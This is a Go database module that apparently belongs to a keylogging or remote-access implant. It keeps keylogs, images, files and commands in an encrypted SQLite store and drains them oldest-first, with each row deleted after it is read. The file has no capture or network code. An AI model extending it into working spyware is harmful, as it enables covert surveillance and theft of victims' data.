package db

import (
	"database/sql"
	"errors"
	"fmt"
	_ "modernc.org/sqlite"
	"os"
	"time"
)

const (
	TableImages   = "images"
	TableFiles    = "files"
	TableCommands = "commands"
	TableKeylogs  = "keylogs"
)

const dbSchemaFilePath = "./db/schema.sql"

func Init(dbPath string, dbPassword string) error {
	firstInstall := false

	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		firstInstall = true
	}

	db, err := GetDB(dbPath, dbPassword)
	if err != nil {
		return err
	}

	if err = loadSchema(db); err != nil {
		return err
	}

	if firstInstall {
		_, err = db.Exec("INSERT INTO metadata (install_time) VALUES (?)", time.Now())
		if err != nil {
			return err
		}
	}

	return nil
}

func GetDB(dbPath string, dbPassword string) (*sql.DB, error) {
	connStr := fmt.Sprintf("%s?_pragma_key=%s", dbPath, dbPassword)
	return sql.Open("sqlite", connStr)
}

func loadSchema(db *sql.DB) error {
	schema, err := os.ReadFile(dbSchemaFilePath)
	if err != nil {
		return fmt.Errorf("failed to read schema.sql: %v", err)
	}
	_, err = db.Exec(string(schema))
	if err != nil {
		return fmt.Errorf("failed to execute schema: %v", err)
	}
	return nil
}

func ReadOldestRow(db *sql.DB, table string) (string, []byte, time.Time, error) {
	rawQuery := "SELECT * FROM %s WHERE exec_time = (SELECT MIN(exec_time) FROM %s) LIMIT 1"
	query := fmt.Sprintf(rawQuery, table, table)
	row := db.QueryRow(query)

	var requestID string
	var data []byte
	var execTime time.Time
	err := row.Scan(&requestID, &data, &execTime)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return "", nil, time.Time{}, nil // No data
		}
		return "", nil, time.Time{}, err
	}
	err = RemoveOneRow(db, table, requestID)
	if err != nil {
		return "", nil, time.Time{}, err
	}
	return requestID, data, execTime, nil
}

func RemoveOneRow(db *sql.DB, table string, requestID string) error {
	query := fmt.Sprintf("DELETE FROM %s WHERE request_id = ?", table)
	_, err := db.Exec(query, requestID)
	return err
}

func WriteDataRow(db *sql.DB, requestID string, dataType string, data []byte) error {
	query := fmt.Sprintf("INSERT INTO data (request_id, data, data_type, exec_time) VALUES (?, ?, ?, ?)")
	_, err := db.Exec(query, requestID, data, dataType, time.Now())
	return err
}
